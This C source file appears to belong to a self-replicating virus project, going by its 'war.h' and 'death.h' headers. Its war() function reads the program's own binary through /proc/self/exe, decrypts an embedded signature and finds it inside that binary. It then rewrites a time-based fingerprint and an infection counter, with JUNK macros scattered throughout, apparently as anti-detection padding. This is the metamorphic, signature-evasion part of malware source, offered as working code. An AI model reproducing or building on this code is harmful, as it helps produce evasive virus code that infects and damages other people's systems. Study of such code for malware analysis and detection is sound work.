#include "death.h"
#include "war.h"
#include "utils.h"
#include "syscall.h"

#define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
#define FNV_PRIME_64 0x00000100000001b3

static uint64_t fnv1a_64(const void *data, size_t len) {
	uint64_t hash = FNV_OFFSET_BASIS_64;
	for (size_t i = 0; i < len; i++) {
		hash ^= ((uint8_t *)data)[i];
		hash *= FNV_PRIME_64;
	}
	return hash;
}

static void hash_to_printable(uint64_t hash, char *fingerprint) {
	/* replace later with sizeof(hash) */
	for (size_t i = 0; i < 8; i++) {
		fingerprint[i] = (hash % 94) + 33;
		hash /= 94;
	}
}

void update_fingerprint(char *fingerprint, t_data *data) {
	struct timeval tv;

	uint64_t hash = fnv1a_64(data->bs_data->argv[0], ft_strlen(data->bs_data->argv[0]));

	gettimeofday(&tv, NULL);

	uint64_t ns = tv.tv_sec * 1000000 + tv.tv_usec;
	hash ^= fnv1a_64(&ns, sizeof(ns));

	hash_to_printable(hash, fingerprint);
}

static void hash_with_time(char *fingerprint) {
	struct timeval tv;
	gettimeofday(&tv, NULL);

	uint64_t ns = tv.tv_sec * 1000000 + tv.tv_usec;
	uint64_t hash = fnv1a_64(&ns, sizeof(ns));
	hash_to_printable(hash, fingerprint);

}

static void increment_counter(char *counter) {

	JUNK;

	for (int i = 3; i >= 0; i--) {
		if (counter[i] == '9') {
			counter[i] = '0';
		} else {
			counter[i] += 1;
			break;
		}
	}

	JUNK;
}

static int abs_path(char *self_name) {
	char buf[PATH_MAX];
	char proc_self_exe[] = "/proc/self/exe";

	JUNK;

	int ret = readlink(proc_self_exe, buf, PATH_MAX);
	if (ret == -1) {
		return -1;
	}
	buf[ret] = '\0';

	ft_strncpy(self_name, buf, PATH_MAX);

	JUNK;

	return 0;
}

int war(size_t increment, file_t *file) {

	char self_name[PATH_MAX];

	if (abs_path(self_name) == -1) {
		return -1;
	}

	JUNK;

	struct stat st;
	/* we could open the file with O_RDWR but text file is busy */
	int fd = open(self_name, O_RDONLY);

	if (fd == -1) {
		return -1;
	}

	if (fstat(fd, &st) == -1) {
		close(fd);
		return -1;
	}

	/* we could use MAP_SHARED but we can't open the file with O_RDWR */
	uint8_t *self = (uint8_t *)mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (self == MAP_FAILED) {
		close(fd);
		return -1;
	}

	JUNK;

	close(fd);

	char signature[] = "\x42\x1d\x38\x5f\x91\x1a\x1e\xf1\x71\x19\x2e\x5f\xdb\x00\x17\xc5\x71\x15\x38\x10\xc0\x1c\x45\xc3\x35\x5a\x6a\x24\xdc\x18\x5a\xff\x67\x21";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	char *found = ft_memmem(self, st.st_size, signature, ft_strlen(signature));
	if (found == NULL) {
		munmap(self, st.st_size);
		return -1;
	}

	char *fingerprint = found + SIGNATURE_SIZE - 15;
	hash_with_time(fingerprint);

	JUNK;


	char *counter = found + SIGNATURE_SIZE - 6;

	while (increment--) {
		increment_counter(counter);
	}

	file->view = &(t_fileview){.data = self, .size = st.st_size};
	file->mode = st.st_mode;
	ft_strncpy(file->abs_path, self_name, PATH_MAX);

	JUNK;

	return 0;
}
